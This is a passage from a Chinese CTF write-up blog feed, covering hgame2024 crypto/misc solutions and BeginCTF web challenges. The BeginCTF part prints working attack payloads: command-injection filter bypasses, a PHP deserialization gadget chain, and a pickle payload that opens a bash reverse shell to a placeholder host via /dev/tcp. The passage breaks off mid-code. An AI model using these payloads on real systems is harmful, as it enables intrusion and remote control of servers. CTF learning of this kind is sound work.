y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_unique_strings</span>(<span class="params">n, length</span>):</span><br><span class="line">    unique_strings = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(unique_strings) &lt; n:</span><br><span class="line">        random_string = secrets.token_hex(length // <span class="number">2</span>)</span><br><span class="line">        unique_strings.add(random_string)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(unique_strings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">random_strings = generate_unique_strings(<span class="built_in">len</span>(flag), <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line">key_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_time</span>(<span class="params">image, name</span>):</span><br><span class="line">    time.sleep(random.random())</span><br><span class="line">    image.save(<span class="string">&quot;.\\png_out\\&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    current_image = draw_text(current_image, <span class="number">120</span>, <span class="number">80</span>, flag[i])</span><br><span class="line">    threading.Thread(target=random_time, args=(xor_images(current_image, key_image), random_strings[i])).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以知道flag是不断追加在画布<code>current_image</code>上的，每次追加完都会和<code>key_image</code>异或后输出一张图片。</p><p>只要确定 <code>i-1</code> 和 <code>i</code>，它们相互异或，就能得到 <code>flag[i]</code> 字符</p><p>先把所有情况都异或出来，然后单独放一个文件夹。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">base_dir = <span class="string">&#x27;./png_out&#x27;</span></span><br><span class="line"></span><br><span class="line">files = [file <span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(base_dir)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">    os.makedirs(<span class="string">f&#x27;./img/<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;files[i].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(files)):</span><br><span class="line">        img = xor_images(Image.<span class="built_in">open</span>(<span class="string">f&quot;./png_out/<span class="subst">&#123;files[i]&#125;</span>&quot;</span>),Image.<span class="built_in">open</span>(<span class="string">f&quot;./png_out/<span class="subst">&#123;files[j]&#125;</span>&quot;</span>))</span><br><span class="line">        img.save(<span class="string">f&#x27;./img/<span class="subst">&#123;i&#125;</span>_<span class="subst">&#123;files[i].split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>]&#125;</span>/<span class="subst">&#123;files[j]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>查看所有文件夹，按照大小升序排序，可以在<code>9_5c55dc77</code>文件夹下看到这个情况。</p><p><img src="/./hgame2024_week1/c_3_1.png"></p><p>由此可以确定<code>5c55dc77.png</code>对应着 <code>flag[0]</code> 的<code>h</code>，再对这个文件夹单独处理。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)</span><br><span class="line">    pixels1 = image1.load()</span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):</span><br><span class="line">            r1, g1, b1 = pixels1[x, y]</span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2)</span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">base_dir = <span class="string">&#x27;./9_5c55dc77&#x27;</span></span><br><span class="line"></span><br><span class="line">files = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> os.listdir(base_dir):</span><br><span class="line">    imgSize = os.stat(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+file).st_size</span><br><span class="line">    files[file]=imgSize</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据大小排序</span></span><br><span class="line">sort_files = <span class="built_in">sorted</span>(files.items(),key = <span class="keyword">lambda</span> d:d[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(sort_files)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sort_files)-<span class="number">1</span>):</span><br><span class="line">    img1 = sort_files[i][<span class="number">0</span>]</span><br><span class="line">    img2 = sort_files[i+<span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    img = xor_images(Image.<span class="built_in">open</span>(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+img1),Image.<span class="built_in">open</span>(<span class="string">&#x27;./9_5c55dc77/&#x27;</span>+img2))</span><br><span class="line">    img.save(<span class="string">f&#x27;./new_img/<span class="subst">&#123;<span class="built_in">str</span>(i)&#125;</span>.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>可以在<code>new_img</code>文件夹下看到flag。</p><p><img src="/./hgame2024_week1/c_3_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;1adf_17eb_803c&#125;</span><br></pre></td></tr></table></figure><h2 id="ezPRNG"><a href="#ezPRNG" class="headerlink" title="ezPRNG"></a>ezPRNG</h2><p>用z3求解即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output=[<span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>, <span class="string">&#xx27;</span>]</span><br><span class="line"></span><br><span class="line">mask=<span class="number">0b10001001000010000100010010001001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PRNG</span>(<span class="params">R,mask</span>):</span><br><span class="line">    nextR = (R &lt;&lt; <span class="number">1</span>) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    i=(R&amp;mask)&amp;<span class="number">0xffffffff</span></span><br><span class="line">    nextbit=<span class="number">0</span> </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        nextbit ^= (i%<span class="number">2</span>)</span><br><span class="line">        i = i&gt;&gt;<span class="number">1</span></span><br><span class="line">    nextR^=nextbit </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (nextR,nextbit)</span><br><span class="line">    </span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    R = BitVec(<span class="string">&#x27;R&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">    s = Solver()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        (R,nextbit)=PRNG(R,mask)</span><br><span class="line">        s.add(nextbit==output[k][i])</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> s.check() == sat:</span><br><span class="line">        res = s.model()</span><br><span class="line">        m = <span class="built_in">str</span>(res)[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">        flag+=<span class="built_in">hex</span>(<span class="built_in">int</span>(m))[<span class="number">2</span>:]</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">hgame = <span class="string">&#x27;hgame&#123;&#x27;</span>+flag[:<span class="number">8</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">8</span>:<span class="number">12</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">12</span>:<span class="number">16</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">16</span>:<span class="number">20</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">20</span>:]+<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(hgame)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fbbbee823f434f919337907880e4191a</span></span><br><span class="line"><span class="comment"># hgame&#123;fbbbee82-3f43-4f91-9337-907880e4191a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> MISC </tag>
            
            <tag> CRYPTO </tag>
            
            <tag> PWN </tag>
            
            <tag> REVERSE </tag>
            
            <tag> hgame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeginCTF WP</title>
      <link href="/BeginCTF/"/>
      <url>/BeginCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="readbooks"><a href="#readbooks" class="headerlink" title="readbooks"></a>readbooks</h2><p>这题主打一个大胆猜测（</p><p>先抓包，在<code>/publuc/xx</code>可以查看文件，在<code>/list/</code>路由可以查看目录。</p><p>传入<code>/list/*</code>，可以得到文件的目录</p><p><img src="/./BeginCTF/w_1_1.png"></p><p>接着去<code>/publuc/</code>路由读<code>app.py</code>，传入<code>/publuc/a*</code>，即可得到源码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">DISALLOWED1 = [<span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line">DISALLOWED_FILES = [<span class="string">&#x27;app.py&#x27;</span>, <span class="string">&#x27;templates&#x27;</span>, <span class="string">&#x27;etc&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;blacklist&#x27;</span>]</span><br><span class="line">BLACKLIST = [x[:-<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;./blacklist.txt&quot;</span>).readlines()][:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">BLACKLIST.append(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;\\&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot; &quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">BLACKLIST.append(<span class="string">&quot;tc&quot;</span>)</span><br><span class="line"></span><br><span class="line">ALLOW = [</span><br><span class="line">    <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pwd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> ALLOW:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        BLACKLIST.remove(a)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/index&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/public/&lt;path:name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readbook</span>(<span class="params">name</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(name)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> DISALLOWED1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> DISALLOWED_FILES:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = os.popen(<span class="string">&#x27;cat &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name)).read()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/list/&lt;path:name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">listbook</span>(<span class="params">name</span>):</span><br><span class="line">    name = <span class="built_in">str</span>(name)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> DISALLOWED1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> DISALLOWED_FILES:</span><br><span class="line">        <span class="keyword">if</span> j <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;banned!&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line">    cmd = <span class="string">&#x27;ls &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(name)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = os.popen(cmd).read()</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8878</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据源码逻辑，很明显能在路由那里命令执行。</p><p>绕过过滤，通过在关键字中间插入<code>&#39;&#39;</code>来绕过关键字过滤，比如<code>echo</code>能用<code>ec&#39;&#39;ho</code>来绕过，空格能用 <code>$&#123;IFS&#125;</code>绕过，反引号没被过滤，可以内联执行。</p><p>因为<code>\</code> 、<code>/</code>、<code>.</code>被过滤了，因此不能跳转路径，但<code>|</code>没被过滤，因此可以使用<code>echo</code>搭配<code>base64</code>来写sh，再用<code>bash</code>来执行 sh文件。</p><p>先写sh，写入一个<code>ls /</code>。</p><p>先把<code>ls /&gt;2</code>进行 <code>base64</code>编码，得到<code>bHMgLz4y</code> ，然后写进一个文件内。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`ec<span class="string">&#x27;&#x27;</span>ho<span class="variable">$&#123;IFS&#125;</span>bHMgLz4y|bas<span class="string">&#x27;&#x27;</span>e64<span class="variable">$&#123;IFS&#125;</span>-d&gt;1`</span><br></pre></td></tr></table></figure><p><img src="/./BeginCTF/w_1_2.png"></p><p><img src="/./BeginCTF/w_1_3.png"></p><p>接着执行<code>bash$&#123;IFS&#125;1</code>，查看文件2 。</p><p><img src="/./BeginCTF/w_1_4.png"></p><p>接着采用相同的操作，执行<code>cat /_flag&gt;2</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`ec<span class="string">&#x27;&#x27;</span>ho<span class="variable">$&#123;IFS&#125;</span>Y2F0IC9fZmxhZz4y|bas<span class="string">&#x27;&#x27;</span>e64<span class="variable">$&#123;IFS&#125;</span>-d&gt;1`</span><br></pre></td></tr></table></figure><p>查看文件2即可得到flag。</p><p><img src="/./BeginCTF/w_1_5.png"></p><h2 id="POPgadget"><a href="#POPgadget" class="headerlink" title="POPgadget"></a>POPgadget</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;begin&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;begin&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>思路：猜测flag在env里，那么执行<code>phpinfo</code>函数即可。</p><ol><li>通过 <code>Fun::__call</code>执行<code>phpinfo</code>。</li><li><code>A::__get</code> 触发 1;</li><li><code>B::__destruct</code> 触发 2</li><li>pop链：<code>B::__destruct =&gt; A::__get =&gt; Fun::__call</code></li></ol><p>poc:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span> = <span class="string">&#x27;call_user_func_array&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Test/&quot;</span>,<span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;a)))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No test in Prod\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;p = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:2:&#123;s:1:&quot;p&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;Fun&quot;:1:&#123;s:9:&quot;Funfunc&quot;;s:20:&quot;call_user_func_array&quot;;&#125;&#125;&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ctrl+f搜flag即可得到flag。</p><p><img src="/./BeginCTF/w_2_1.png"></p><h2 id="pickelshop"><a href="#pickelshop" class="headerlink" title="pickelshop"></a>pickelshop</h2><p>pickle反序列化</p><p>抓包注册一个账号，即可得到<code>cookie</code>。</p><p><img src="/./BeginCTF/w_3_1.png"></p><p>把<code>cookie</code>放到<code>/login</code>页面，登录成功。</p><p><img src="/./BeginCTF/w_3_2.png"></p><p>pickle反弹shell即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Email</span>():</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&#x27;&#x27;&#x27;__import__(&quot;os&quot;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/xxxxx/2333 0&gt;&amp;1&#x27;&quot;).read()&#x27;&#x27;&#x27;</span>,))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">poc = base64.b64encode(pickle.dumps(Email()))</span><br><span class="line"><span class="built_in">print</span>(poc)</span><br><span 